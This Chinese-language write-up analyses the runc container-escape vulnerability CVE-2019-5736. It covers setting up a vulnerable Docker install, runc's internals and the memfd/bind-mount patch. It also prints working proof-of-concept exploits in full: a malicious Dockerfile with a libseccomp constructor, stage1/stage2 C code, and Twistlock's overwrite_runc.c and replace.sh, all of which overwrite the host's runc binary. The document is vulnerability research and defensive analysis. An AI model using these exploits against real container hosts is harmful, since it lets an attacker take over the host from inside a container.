# Docker runc容器逃逸漏洞分析附件(CVE-2019-5736)



## 基础知识

**Docker**  
[https://docs.docker.com/get-started/overview/](https://docs.docker.com/get-started/overview/)  
[https://docs.docker.com/engine/reference/run/](https://docs.docker.com/engine/reference/run/)  
[https://docs.docker.com/engine/reference/commandline/exec/](https://docs.docker.com/engine/reference/commandline/exec/)

**Dockerfile**  
[https://docs.docker.com/engine/reference/builder/](https://docs.docker.com/engine/reference/builder/)
[https://docs.docker.com/engine/reference/builder/#from](https://docs.docker.com/engine/reference/builder/#from)
[https://docs.docker.com/engine/reference/builder/#run](https://docs.docker.com/engine/reference/builder/#run)
[https://docs.docker.com/engine/reference/builder/#add](https://docs.docker.com/engine/reference/builder/#add)
[https://docs.docker.com/engine/reference/builder/#entrypoint](https://docs.docker.com/engine/reference/builder/#entrypoint)

**OCI和runc**  
[https://cizixs.com/2017/11/05/oci-and-runc/](https://cizixs.com/2017/11/05/oci-and-runc/)

**几个易混淆的概念**   

- runc和docker-runc  
runc是一个独立的进程，docker-runc是安装docker后，docker自带的runc，文中提到的可以理解成相同的意思。

- docker.io和docker-ce  
docker.io是ubuntu的docker package的名称;
如果从docker官方源下载则是docker-ce, docker-ce-cli, containerd.io。
本文用的是有漏洞版本的ubuntu package 。


**Linux Namespace**  
[https://lwn.net/Articles/531114/](https://lwn.net/Articles/531114/)


**Linux Control Group**  
[https://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/](https://www.infoq.cn/article/docker-kernel-knowledge-cgroups-resource-isolation/)  

cgroups (abbreviated from control groups) is a Linux kernel feature that limits, accounts for, and isolates the resource usage (CPU, memory, disk I/O, network, etc.) of a collection of processes.

cgroups用于对一组进程可以使用的系统资源做限制。


**libseccomp**  
[https://github.com/seccomp/libseccomp](https://github.com/seccomp/libseccomp)

The libseccomp library provides an easy to use, platform independent, interface to the Linux Kernel's syscall filtering mechanism.

runc的一个依赖库，用于限制容器进程可使用的系统调用。

```
$ ldd /usr/sbin/runc
	linux-vdso.so.1 (0x00007fffd11e6000)
	libpthread.so.0 => /lib/x86_64-linux-gnu/libpthread.so.0 (0x00007f5f0bde7000)
	libseccomp.so.2 => /lib/x86_64-linux-gnu/libseccomp.so.2 (0x00007f5f0bba0000)
	libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5f0b7af000)
	/lib64/ld-linux-x86-64.so.2 (0x00007f5f0c006000)
```

**procfs**  
porc文件系统是一个虚拟文件系统，通常mount到/proc目录，可以理解为系统内核向用户态开放的接口。

`/proc/self/exe` 是当前进程可执行文件的符号链接；  

`/proc/self/fd` 是一个目录，包含了当前进程打开的文件的符号链接，符号链接名称以文件描述符命名。
```
$ more exploit.c 

$ ps -aux|grep -v grep|grep more
invinci+  18760  0.0  0.0  16836   900 pts/5    S+   03:28   0:00 more exploit.c
$ cd /proc/18760/fd
$ ls
0  1  2  3
$ file 3
3: symbolic link to /home/invincible/Desktop/runc_test/exp/exploit.c

```




## 环境搭建

#### 虚拟机安装
系统镜像：[https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso](https://mirrors.tuna.tsinghua.edu.cn/ubuntu-releases/18.04/ubuntu-18.04.4-desktop-amd64.iso)

```
#  创建虚拟机硬盘
$ qemu-img create -f qcow2 ubuntu18.04.4.img 10G

# 安装虚拟机
$ qemu-system-x86_64  -m 2048 -hda ubuntu18.04.4.img -cdrom ./ubuntu-18.04.4-desktop-amd64.iso

# 启动虚拟机
$ qemu-system-x86_64 -m 2048  ubuntu18.04.4.img
```

#### Docker安装
使用Ubunt的发行版本的packeg: docker-io ( Docker官方仓库的packges: docker-ce, docker-ce-cli, container.io 漏洞已经修复)

查看可安装版本:

```
$ apt-cache policy docker.io
docker.io:
  Installed: 17.12.1-0ubuntu1
  Candidate: 19.03.6-0ubuntu1~18.04.1
  Version table:
     19.03.6-0ubuntu1~18.04.1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-updates/universe amd64 Packages
     18.09.7-0ubuntu1~18.04.4 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic-security/universe amd64 Packages
 *** 17.12.1-0ubuntu1 500
        500 https://mirrors.tuna.tsinghua.edu.cn/ubuntu bionic/universe amd64 Packages
        100 /var/lib/dpkg/status
```



查看docker.io的changelog:

```
$ PAGER=cat apt-get -q=2 changelog docker.io 
...
docker.io (18.09.2-0ubuntu1) disco; urgency=medium

  * Update to 18.09.2, including fix for CVE-2019-5736.
    - Convert components/engine/git-bundles/CVE-2019-5736.bundle into
      d/patches/0001-nsenter-clone-proc-self-exe-to-avoid-exposing-host-b.patch.
    - Hard code RUNC_COMMIT in d/rules for now.

 -- Michael Hudson-Doyle <michael.hudson@ubuntu.com>  Tue, 12 Feb 2019 10:55:11 +1300

...
```

在[官网](https://ubuntu.pkgs.org/18.04/ubuntu-universe-amd64/docker.io_17.12.1-0ubuntu1_amd64.deb.html)下载低版本[package](http://archive.ubuntu.com/ubuntu/pool/universe/d/docker.io/docker.io_17.12.1-0ubuntu1_amd64.deb)，或者[百度云]( https://pan.baidu.com/s/1PO4OV_el6fQ0xgymF8FsXg) 密码:q9vg，下载后安装：

```
$ sudo dpkg -i docker.io_17.12.1-0ubuntu1_amd64.deb
...

$ docker --version
Docker version 17.12.1-ce, build 7390fc6

$ docker-runc --version
runc version 1.0.0-rc4+dev
commit: 9f9c96235cc97674e935002fc3d78361b696a69e
spec: 1.0.0
```


或者直接apt-get安装(如果还有的话)：

```
$ sudo apt-get install docker.io=17.12.1-0ubuntu1
```

## 复现环境PoC  
使用的是通过构造恶意容器镜像，当运行容器时触发漏洞的方式(```Docker run```)。

链接:[https://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A](https://pan.baidu.com/s/1HKZREeCc3TCu7LPTv5wm7A)  密码:piqr

```
$ tree
.
├── Dockerfile
├── README
├── stage1.c
└── stage2.c

0 directories, 4 files
```


```
$ cat Dockerfile
FROM ubuntu:18.04
# 继承ubuntu:18.04 image
RUN set -e -x ;\
    sed -i 's,# deb-src,deb-src,' /etc/apt/sources.list ;\
    apt -y update ;\
    apt-get -y install build-essential ;\
    cd /root ;\
    apt-get -y build-dep libseccomp ;\
    apt-get source libseccomp
    
ADD stage1.c /root/stage1.c
RUN set -e -x ;\
    cd /root/libseccomp-* ;\
    cat /root/stage1.c >> src/api.c ;\
    DEB_BUILD_OPTIONS=nocheck dpkg-buildpackage -b -uc -us ;\
    dpkg -i /root/*.deb
# libseccomp是runc加载的一个动态库
# 原Poc这里是cd /root/libseccomp-2.3.1, 但是apt-get source libseccomp会安装最新的版本，所以这个版本号需要修改
# 这几步是下载libseccomp的源码包，修改源码的src/api.c文件，追加写入了stage1.c的内容(给api.c增加了一个构造函数，在它的main函数之前执行)，将修改的libseccomp构建成dep包并安装

ADD stage2.c /root/stage2.c
RUN set -e -x ;\
    cd /root ;\
    gcc stage2.c -o /stage2
# 编译stage2.c，等待被stage1加载并执行

ENTRYPOINT [ "/entrypoint" ]


RUN set -e -x ;\
    ln -s /proc/self/exe /entrypoint
# 把/proc/self/exe设置为容器的entrypoint，让runc运行容器时执行/proc/self/exe
# 即在容器iamge中执行runc进程，进而加载恶意构造的动态库，执行后面的exp代码(stage1.c stage2.c, 完成对runc可执行文件的修改)
```


```
$ cat stage1.

#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>


__attribute__ ((constructor)) void foo(void)
{
    int fd = open("/proc/self/exe", O_RDONLY);
    if (fd == -1 ) {
        printf("HAX: can't open /proc/self/exe\n");
        return;
    }
    printf("HAX: fd is %d\n", fd);
    char *argv2[3];
    argv2[0] = strdup("/stage2");
    char buf[128];
    snprintf(buf, 128, "/proc/self/fd/%d", fd);
    argv2[1] = buf;
    argv2[2] = 0;
    execve("/stage2", argv2, NULL);
}


/*


__attribute__ ((constructor))
The constructor attribute causes the function to be called automatically before execution enters main (). 


打开当前进程的可执行文件，execve执行子进程stage2并将文件描述符作为参数传递给stage2
*/
```

```
$ cat stage2.c
#include <stdio.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <errno.h>


int main(int argc, char **argv) {
    printf("HAX2: argv: %s\n", argv[1]);
    int fd = open(argv[1], O_RDWR|O_APPEND);
    printf("HAX2: fd: %d\n", fd);

    const char *poc = "cve-2019-5736";
    int res = write(fd, poc, strlen(poc));
    printf("HAX2: res: %d, %d\n", res, errno);
}

/*
根据stage1传入的runc路径， 将poc追加写入该文件末尾，完成对宿主机runc可执行文件的修改。
*/
```

## 复现环境Exp  
链接:[https://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw](https://pan.baidu.com/s/1d1ABdQLDdKwEKkX2dW-cbw)  密码:83fs

[twistlock@github](https://github.com/twistlock/RunC-CVE-2019-5736)

##  其他Poc  
[https://github.com/twistlock/RunC-CVE-2019-5736](https://github.com/twistlock/RunC-CVE-2019-5736)  

其他版本-Go版本：[by Frichetten@github](https://github.com/Frichetten/CVE-2019-5736-PoC)  
其他版本-C版本：[by feexd](https://github.com/feexd/pocs/tree/master/CVE-2019-5736)[@github](https://github.com/Frichetten/CVE-2019-5736-PoC)  

下面介绍的是构造恶意容器进程触发漏洞的Poc。这种方式触发条件比另一种方式要更为苛刻，实际测试时由于无法控制程序时序，尝试了几次都失败了。
```
$ tree
.
├── Dockerfile
├── bash_evil
├── new_runc
├── new_runc.c
├── overwrite_runc
├── overwrite_runc.c
└── replace.sh

```

```
$ cat Dockerfile
FROM ubuntu:18.04

COPY replace.sh /
RUN ["chmod", "+x", "/replace.sh"]
COPY overwrite_runc /overwrite_runc
RUN ["chmod", "+x", "/overwrite_runc"]
COPY new_runc /

RUN ["mv", "/bin/bash", "/bin/bash_original"]
COPY bash_evil /bin/bash
RUN ["chmod", "+x", "/bin/bash"]

ENTRYPOINT ["/bin/bash_original", "/replace.sh"]

# 将replace.sh, overwrite_runc, new_runc复制到容器iamge
# 将容器image的/bin/bash 替换成bash_evil
# 将replace.sh作为entrypoint在docker run时执行

```

```
$ cat bash_evil
#!/proc/self/exe
```

```
$ cat replace.sh
#!/bin/bash_original
echo "[+] Waiting for runC to be executed in the container..."

runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')

# Wait for /proc/self/exe to be executed
while [ -z "$runc_pid" ]
do
    runc_pid=$(ps axf | grep /proc/self/exe | grep -v grep | awk '{print $1}')
done

# Call overwrite_runc with the symlink to the runC binary
./overwrite_runc /proc/${runc_pid}/exe

# 1. 持续检测进程，等待runc进程出现(表示修改后的/bin/sh被runc exec执行)
# 2. 执行overwrite_runc修改/proc/[runc-pid]/exe文件为new_runc

```

```
$ cat new_runc.c

#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

int main(int argc, char *argv[])
{
	printf("\n**THE ALL NEW AND IMPROVED RUNC**\n\n");
	printf("\t[+] Your backdoor here ->\n\n");
	return 0;
}
// 这里是覆盖runc文件的payload代码 

```

```
$ cat overwrite_runc.c
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <errno.h>

#include <stdlib.h>
#include <string.h>
#include <stdio.h>

/* Simple Buffer*/
typedef struct Buffer
{
	int len;		// buffer length
	void * buff;	// buffer data
} Buffer;


#define FALSE 0
#define TRUE  1

const char * DEFAULT_NEW_RUNC_PATH = "/new_runc";
const unsigned int PATH_MAX_LEN = 30;
const int OPEN_ERR = -1;
const int RET_ERR = 1;
const int RET_OK = 0;

const long WRITE_TIMEOUT = 99999999999999999;
Buffer read_new_runc(char * new_runc_path);


/*
* Usage: overwrite_runc </proc/runc_pid/exe> <new runc path>
* Overwrites the runC binary.
*/
int main(int argc, char *argv[])
{
	int runc_fd_read, my_runc_fd, wc;
	char my_runc_fd_path[PATH_MAX_LEN];
	char * new_runc_path;                    	 // path to file to replace runc
	char * runc_exe_path;
	Buffer new_runc;


	if (argc == 1 || argc > 3)
	{
		printf("Usage: %s </proc/runc_pid/exe> <new runc path>\n", argv[0]);
		return RET_ERR;
	}


	/* Open /proc/runc_pid/exe for reading */
	runc_exe_path = argv[1];
	runc_fd_read = open(runc_exe_path, O_RDONLY);
	if (runc_fd_read == OPEN_ERR)
	{
		printf("[!] Couldn't open runC's exe %s\n", runc_exe_path);
		perror("[!] Open");
		return RET_ERR;
	}
	printf("[+] Got %s as fd %d in this process\n", runc_exe_path, runc_fd_read);



	/* Read new_runc */
	if (argc < 3)
		new_runc_path = DEFAULT_NEW_RUNC_PATH;
	else
		new_runc_path = argv[2];
	new_runc = read_new_runc(new_runc_path);
	if (new_runc.buff == NULL)
	{
		close(runc_fd_read);
		return RET_ERR;
	}
	printf("[+] Read %d bytes from new runC\n", new_runc.len);


	/* Try to open /proc/self/fd/runc_fd_read for writing */
	/* Will Succeed after the runC process exits          */
	sprintf(my_runc_fd_path, "/proc/self/fd/%d", runc_fd_read);
	int opened = FALSE;
	for (long count = 0; (!opened && count < WRITE_TIMEOUT); count++)
	{
		my_runc_fd = open(my_runc_fd_path, O_WRONLY | O_TRUNC);
		if (my_runc_fd != OPEN_ERR)
		{
			wc = write(my_runc_fd, new_runc.buff, new_runc.len);
			if (wc !=  new_runc.len)
			{
				printf("[!] Couldn't write to my process's runC's fd %s\n", my_runc_fd_path);
				close(my_runc_fd);
				close(runc_fd_read);
				free(new_runc.buff);
				return RET_ERR;
			}
			printf("[+] Opened runC (using %s) for writing\n", my_runc_fd_path);
			printf("[+] Succesfully overwritten runC\n");
			opened = TRUE;
		}
	}

	/* Clean ups & return */
	close(my_runc_fd);
	close(runc_fd_read);
	free(new_runc.buff);
	if (opened == FALSE)
	{
		printf("[!] Reached timeout, couldn't write to runc at %s\n", my_runc_fd_path);
		return RET_ERR;
	}
	else
		printf("[+] Done, shuting down ...\n");

	fflush(stdout);
	return RET_OK;
}


/*
* Reads from the file at new_runc_path, returns a Buffer with new_runc's content.
*/
Buffer read_new_runc(char * new_runc_path)
{
	Buffer new_runc = {0, NULL};
	FILE *fp_new_runc;
	int file_size, rc;
	void * new_runc_content;
	char ch;


	// open new_Runc
	fp_new_runc = fopen(new_runc_path, "r"); // read mode
	if (fp_new_runc == NULL)
	{
	  printf("[!] open file err while opening the new runc file %s\n", new_runc_path);
	  return new_runc;
	}


	// Get file size and prepare buff
	fseek(fp_new_runc, 0L, SEEK_END);
	file_size = ftell(fp_new_runc);
	new_runc_content = malloc(file_size);
	rewind(fp_new_runc);


	rc = fread(new_runc_content, 1, file_size, fp_new_runc);
	if (rc != file_size)
	{
		printf("[!] Couldn't read from new runc file at %s\n", new_runc_path);
		free(new_runc_content);
		return new_runc;
	}


	fclose(fp_new_runc);
	new_runc.len = rc;
	new_runc.buff = new_runc_content;
	return new_runc;


}

```

使用：
```
$ git clone https://github.com/twistlock/RunC-CVE-2019-5736

$ docker build -t cve-2019-5736:exec_POC ./RunC-CVE-2019-5736/exec_POC
$ docker run -d --rm --name poc_ctr cve-2019-5736:exec_POC
$ docker exec poc_ctr bash

```

实际测试：
```
# docker run --rm --name poc_ctr cve-2019-5736:exec_POC
[+] Waiting for runC to be executed in the container...
[!] Open: No such file or directory
[!] Couldn't open runC's exe /proc/2851/exe

```


## runc原理分析
#### runc run  
runc创建和运行容器的命令是：runc run，它代码流程相当于依次执行runc create和runc start命令。  

首先根据配置文件config.json创建容器对象linuxContainer，其中包含了namespace、cgroups、device和mountpoint等各种配置信息;  

然后通过创建子进程的方式执行 runc init，runc init进行一系列初始化后( 比如创建容器文件系统，加入和配置命名空间)，调用 execve syscall 将自己变成需要执行的容器进程;  

在此之前，会先通过写入命名管道exec.fifo阻塞，等待直至runc start命令执行，读取exec.fifo的内容。

##### 容器创建
容器创建主要工作是将OCI格式的配置文件config.json加载到内存linuxContainer结构体中
```
type linuxContainer struct {
	id                   string
	root                 string
	config               *configs.Config
	cgroupManager        cgroups.Manager
	intelRdtManager      intelrdt.Manager
	initPath             string
	initArgs             []string
	initProcess          parentProcess
	initProcessStartTime uint64
	criuPath             string
	newuidmapPath        string
	newgidmapPath        string
	m                    sync.Mutex
	criuVersion          int
	state                containerState
	created              time.Time
}

```

结构体initProcess保存了创建容器初始化进程(runc init)的相关信息:

```
type initProcess struct {
	cmd             *exec.Cmd
	messageSockPair filePair
	logFilePair     filePair
	config          *initConfig
	manager         cgroups.Manager
	intelRdtManager intelrdt.Manager
	container       *linuxContainer
	fds             []string
	process         *Process
	bootstrapData   io.Reader
	sharePidns      bool
}
```


创建容器时，设置了子进程的path和参数：`/proc/self/exe init` 即 `runc init`  
```
// runc/libcontainer/factory_linux.go -> New()

func New(root string, options ...func(*LinuxFactory) error) (Factory, error) {
	// ...
	l := &LinuxFactory{
		Root:      root,
		InitPath:  "/proc/self/exe",
		InitArgs:  []string{os.Args[0], "init"},
		Validator: validate.New(),
		CriuPath:  "criu",
	}
    // ...
	return l, nil
}

```

```
// runc/libcontainer/process_linux.go -> start()

func (p *initProcess) start() (retErr error) {
  ...
  err := p.cmd.Start()
  ...
  
  // Wait for our first child to exit
  if err := p.waitForChildExit(childPid); err != nil {
    	
  // ...
  p.sendConfig()
    
  // ...
  parseSync(p.messageSockPair.parent, func(sync *syncT) error {
    switch sync.Type {
		case procReady:
        // ...
        writeSync(p.messageSockPair.parent, procRun)
    case procHooks:
        writeSync(p.messageSockPair.parent, procResume)
  
}

```
p.cmd.Start()是使用的go的package exec，启动一个子进程执行系统命令。  


执行子进程需要的命令行配置在commandTemplate中设置
```
// runc/libcontainer/container_linux.go -> commandTemplate()

func (c *linuxContainer) commandTemplate(p *Process, childInitPipe *os.File, childLogPipe *os.File) *exec.Cmd {
	cmd := exec.Command(c.initPath, c.initArgs[1:]...)
	cmd.Args[0] = c.initArgs[0]
	cmd.Stdin = p.Stdin
	cmd.Stdout = p.Stdout
	cmd.Stderr = p.Stderr
	cmd.Dir = c.config.Rootfs
  
	if cmd.SysProcAttr == nil {
		cmd.SysProcAttr = &syscall.SysProcAttr{}
	}

  cmd.Env = append(cmd.Env, fmt.Sprintf("GOMAXPROCS=%s", os.Getenv("GOMAXPROCS")))
	cmd.ExtraFiles = append(cmd.ExtraFiles, p.ExtraFiles...)
	if p.ConsoleSocket != nil {
		cmd.ExtraFiles = append(cmd.ExtraFiles, p.ConsoleSocket)
		cmd.Env = append(cmd.Env,
			fmt.Sprintf("_LIBCONTAINER_CONSOLE=%d", stdioFdCount+len(cmd.ExtraFiles)-1),
		)
	}
	cmd.ExtraFiles = append(cmd.ExtraFiles, childInitPipe)
	cmd.Env = append(cmd.Env
		fmt.Sprintf("_LIBCONTAINER_INITPIPE=%d", stdioFdCount+len(cmd.ExtraFiles)-1),
		fmt.Sprintf("_LIBCONTAINER_STATEDIR=%s", c.root),
	)


	cmd.ExtraFiles = append(cmd.ExtraFiles, childLogPipe)
	cmd.Env = append(cmd.Env,
		fmt.Sprintf("_LIBCONTAINER_LOGPIPE=%d", stdioFdCount+len(cmd.ExtraFiles)-1),
		fmt.Sprintf("_LIBCONTAINER_LOGLEVEL=%s", p.LogLevel),
	)
  // ...


  return c
}

```

##### 容器初始化  

容器初始化通过`runc init`完成，可以说容器进程区别于正常系统进程的核心要素都是通过`runc init`来实现。  
它首先对当前进程完成容器进程需要的各种限制和隔离，然后通过系统调用execve将自己变成需要执行的进程。

```
// runc/init.go

package main


import (
    // ...
	_ "github.com/opencontainers/runc/libcontainer/nsenter"
    // ...
)

// ...
var initCommand = cli.Command{
	Name:  "init",
	Usage: `initialize the namespaces and launch the process (do not call it outside of runc)`,
  // ...
	Action: func(context *cli.Context) error {
		factory, _ := libcontainer.New("")
		if err := factory.StartInitialization(); err != nil {
		// ...
	},
}

```

```
// runc/libcontainer/ nsenter/nsexec.c -> nsexec()

void nsexec(void)
{
  // ...
  case JUMP_CHILD:{
    //...
    if (config.namespaces)
     join_namespaces(config.namespaces);
    
    if (config.cloneflags & CLONE_NEWUSER) {
     if (unshare(CLONE_NEWUSER) < 0)
      bail("failed to unshare user namespace");
     config.cloneflags &= ~CLONE_NEWUSER;
     
    if (unshare(config.cloneflags & ~CLONE_NEWCGROUP) < 0)
      bail("failed to unshare namespaces");
    // ...
    }
}
      

```


容器初始化工作在这里完成，最后阻塞在write exec.fifo，等待容器启动

```
// runc/libcontainer/standard_init_linux.go ->  Init()

func (l *linuxStandardInit) Init() error {   
  ... 
  setupNetwork(l.config)
  ...
  setupRoute(l.config.Config)
  ...
  prepareRootfs(l.pipe, l.config)
  ...
  finalizeRootfs(l.config.Config)
  ...
  syncParentReady(l.pipe)
  ... 
  seccomp.InitSeccomp(l.config.Config.Seccomp)
  ...
  finalizeNamespace(l.config)
  ...
  name, err := exec.LookPath(l.config.Args[0])
  ...
  fd, err := unix.Open(fmt.Sprintf("/proc/self/fd/%d", l.fifoFd), unix.O_WRONLY|unix.O_CLOEXEC, 0)
  ...
  if _, err := unix.Write(fd, []byte("0")); err != nil {
  ...
  syscall.Exec(name, l.config.Args[0:], os.Environ())
  ...
}


```

init.go导入的package nsenter是做什么的？

```
$ cat README.md
The `nsenter` package registers a special init constructor that is called before the Go runtime has a chance to boot.  

This provides us the ability to `setns` on existing namespaces 
and avoid the issues that the Go runtime has with multiple 
threads.  

This constructor will be called if this package is registered, 
imported, in your go application.

```
- 对于Mount Namespace来说，一个具有多线程的进程是无法使用setns调用进入到对应的命名空间( the Go runtime has with multiple threads )。
- 所以通过CGO(CGO介绍见下文)在Go runtime 启动之前，执行一个构造函数也就是nsexec.c中的nsexec函数来进行setns操作。
- 这个构造函数会在nsenter package 被导入的时候执行。

package nsenter的主要内容
```
$ pwd
.../runc-master/libcontainer/nsenter
$ tree
.
├── README.md
├── cloned_binary.c
├── namespace.h
├── nsenter.go
├── nsenter_gccgo.go
├── nsenter_test.go
├── nsenter_unsupported.go
└── nsexec.c

0 directories, 8 files

```

```
$ cat nsenter.go
// +build linux,!gccgo

package nsenter

/*
#cgo CFLAGS: -Wall
extern void nsexec();
void __attribute__((constructor)) init(void) {
	nsexec();
}
*/
import "C"

```

这里用到了CGO：
```
$ cat README.md
...
The `nsenter` package will `import "C"` and it uses [cgo](https://golang.org/cmd/cgo/) package. 

In cgo, if the import of "C" is immediately preceded by a comment, that comment, called the preamble, is used as a header when compiling the C parts of the package.
...

```
CGO简单说就是: 通过go调用C语言代码，语法是 import "C"语句+前面的注释(称为preamble)，preamble部分就是C语言代码(当C代码在不同文件时，preamble可以只写头文件引用)。
具体参考：
[https://golang.org/cmd/cgo/](https://golang.org/cmd/cgo/)
[https://bastengao.com/blog/2017/12/go-cgo-c.html](https://bastengao.com/blog/2017/12/go-cgo-c.html)

上面的代码差不多是这样的效果：
```
$ tree
.
├── cgo_c.c
└── cgo_example.go

0 directories, 2 files

$ cat cgo_c.c
#include <stdio.h>

void c_func1(){
	printf("Hello, CGO!\n");
}

void c_func2(){
	printf("Goodbye, CGO!\n");
}

$ cat cgo_example.go
package main

/*
extern void c_func1();
extern void c_func2();

void __attribute__((constructor)) init(void) {
	c_func1();
}

*/
import "C"

func main(){
	C.c_func2()
}

$ go build -o cgo
$ ./cgo
Hello, CGO!
Goodbye, CGO!


```

关于`__attribute__((constructor))`: 它是一个面向gcc的特性，功能是设置一个在main函数执行前执行的构造函数。

##### 容器启动  

主要做的就是读取exec.fifo数据，让`runc init`继续执行

```
// runc/libcontainer/container_linux.go -> exec()

func (c *linuxContainer) exec() error {
	path := filepath.Join(c.root, execFifoFilename)
	pid := c.initProcess.pid()
	blockingFifoOpenCh := awaitFifoOpen(path)
    // ... 
    return handleFifoResult(result)
    // ...
}

```

```
// runc/libcontainer/container_linux.go  -> handleFifoResult()

func handleFifoResult(result openResult) error {
   // ...
   f := result.file
   readFromExecFifo(f)
   // ...
   return os.Remove(f.Name())
}

```


#### runc exec   
runc执行一个容器进程的命令是: `runc exec`，它和`runc run`的流程相似，但不会创建新容器，而是通过id获取已经创建的容器，之后也会通过创建`runc init`进程对容器进程初始化，然后通过`syscall execve`将自己替换成要执行的容器进程。



## 补丁分析
#### 补丁概述
简单总结就是：通过某种方式clone一个runc的`/proc/self/exe`的只读副本，该副本是一个只读的内存文件，然后重新执行clone出的内存文件，从而使runc进程的proc符号链接(`/proc/self/exe`)对应的是该内存文件副本。

 为了修复这个漏洞，在runc源码`libcontainer/nsenter/nsexec.c` 文件的`nsexec`函数中增加了一个`ensure_cloned_binary`函数调用：

```
if (ensure_cloned_binary() < 0)
		bail("could not ensure we are a cloned binary");
```
它的实现在文件`libcontainer/nsenter/cloned_binary.c` 中：

```
int ensure_cloned_binary(void)
{
   int execfd;
   ...
   int cloned = is_self_cloned();
   
   if (cloned > 0 || cloned == -ENOTRECOVERABLE)
     return cloned;
   ...
   execfd = clone_binary();
   ...
   fexecve(execfd, argv, environ);
   ...
}
   
```
* ensure_cloned_binary函数首先通过is_self_cloned函数判断当前进程的可执行文件是否是cloned(这里的clone可以理解成复制文件，而不是clone一个子进程的那个clone)；
* 如果runc是第一次被执行，则会返回false，然后通过clone_binary函数复制/proc/self/exe文件；
* 最后通过fexecve重新启动当前进程，对应的可执行文件是复制后的文件；
* 下一次执行的时候，is_self_cloned函数会返回true，然后进入打补丁前的正常流程。


#### ensure_cloned_binary->is_self_cloned
is_self_cloned是如何判断当前文件是否是clone过的？

```
#define RUNC_MEMFD_SEALS \
	(F_SEAL_SEAL | F_SEAL_SHRINK | F_SEAL_GROW | F_SEAL_WRITE)


#ifndef F_SEAL_SEAL
#  define F_SEAL_SEAL   0x0001	/* prevent further seals from being set */
#  define F_SEAL_SHRINK 0x0002	/* prevent file from shrinking */
#  define F_SEAL_GROW   0x0004	/* prevent file from growing */
#  define F_SEAL_WRITE  0x0008	/* prevent writes */
#endif


static int is_self_cloned(void)
{
	int fd, ret, is_cloned = 0;
	struct stat statbuf = {};
	struct statfs fsbuf = {};


	fd = open("/proc/self/exe", O_RDONLY|O_CLOEXEC);
	if (fd < 0)
		return -ENOTRECOVERABLE;


	/*
	 * Is the binary a fully-sealed memfd? We don't need CLONED_BINARY_ENV for
	 * this, because you cannot write to a sealed memfd no matter what (so
	 * sharing it isn't a bad thing -- and an admin could bind-mount a sealed
	 * memfd to /usr/bin/runc to allow re-use).
	 */
  // 通过获取文件的SEALS判断，当前可执行文件是不是设置过SEALS(只读，大小不可改变)的内存文件
  // 如果是通过make_execd的memfd_create的方式创建的clone文件，则is_clone会设置为true
	ret = fcntl(fd, F_GET_SEALS);
	if (ret >= 0) {
		is_cloned = (ret == RUNC_MEMFD_SEALS);
		goto out;
	}


	// 检查是否设置了CLONED_BINARY_ENV
  // 这个环境变量会在父进程ensure_cloned_binary函数中设置
  // 如果没有设置则判断为第一次启动，当前可执行文件不是cloned
	if (!getenv(CLONED_BINARY_ENV)) {
		is_cloned = false;
		goto out;
	}


	/*
	 * Is the binary on a read-only filesystem? We can't detect bind-mounts in
	 * particular (in-kernel they are identical to regular mounts) but we can
	 * at least be sure that it's read-only. In addition, to make sure that
	 * it's *our* bind-mount we check CLONED_BINARY_ENV.
	 */
  // 如果当前可执行文件在一个只读的filesystem，也可以判断是clone的文件
  // 通过try_bindfd方式创建的话，is_cloned会设置为true
	if (fstatfs(fd, &fsbuf) >= 0)
		is_cloned |= (fsbuf.f_flags & MS_RDONLY);


	/*
	 * Okay, we're a tmpfile -- or we're currently running on RHEL <=7.6
	 * which appears to have a borked backport of F_GET_SEALS. Either way,
	 * having a file which has no hardlinks indicates that we aren't using
	 * a host-side "runc" binary and this is something that a container
	 * cannot fake (because unlinking requires being able to resolve the
	 * path that you want to unlink).
	 */
  // 如果当前可执行文件没有hardlinks也可以判断是clone的临时文件
	if (fstat(fd, &statbuf) >= 0)
		is_cloned |= (statbuf.st_nlink == 0);


out:
	close(fd);
	return is_cloned;
}


```



#### ensure_cloned_binary->clone_binary
clone_binary是如何实现的？  

创建一个只读的，大小不可改变的临时内存文件，作为runc可执行文件的clone。

第一种方式是通过bind mount，见try_bindfd部分

```
static int clone_binary(void)
{
    ...
	/*
	 * Before we resort to copying, let's try creating an ro-binfd in one shot
	 * by getting a handle for a read-only bind-mount of the execfd.
	 */
  
	execfd = try_bindfd();
	if (execfd >= 0)
		return execfd;
    ...
```


第二种方式: 当try_bindfd失败的时候通过make_execfd和seal_execfd来实现clone方案。

通过`make_exec`来创建一个内存文件，拷贝`/proc/self/exe`的数据后，通过`seal_execfd`对该内存文件设置限制使其只读。效果就是创建了一个只存在于内存中的`/proc/self/exe`的只读的clone文件。

```
  	/*
	 * Dammit, that didn't work -- time to copy the binary to a safe place we
	 * can seal the contents.
	 */
    execfd = make_execfd(&fdtype);
    ...
	binfd = open("/proc/self/exe", O_RDONLY | O_CLOEXEC);
	...
    fstat(binfd, &statbuf) 
    ...
    while (sent < statbuf.st_size) {
		int n = sendfile(execfd, binfd, NULL, statbuf.st_size - sent);
		...
		sent += n;
	}
	close(binfd);
	...
	seal_execfd(&execfd, fdtype)
	...
  	return execfd;
  	...
```

##### clone_binary->try_bindfd
尝试将`/proc/self/exe`通过bind mount的方式bind到一个临时文件`/tmp/runc.xxxxxx`

```
static int try_bindfd(void)
{
  ...
  fd = mkstemp(template);
  ...	
  ret = -EPERM;
  if (mount("/proc/self/exe", template, "", MS_BIND, "") < 0)
		goto out;
  
  ...
  if (mount("", template, "", MS_REMOUNT | MS_BIND | MS_RDONLY, "") < 0)
		goto out_umount;
  
  ...
  ret = open(template, O_PATH | O_CLOEXEC);
out_umount:
	...
	if (umount2(template, MNT_DETACH) < 0) {
		if (ret >= 0)
			close(ret);
		ret = -ENOTRECOVERABLE;
	}
  
out:
	...
	unlink(template);
	return ret;
}
  
```
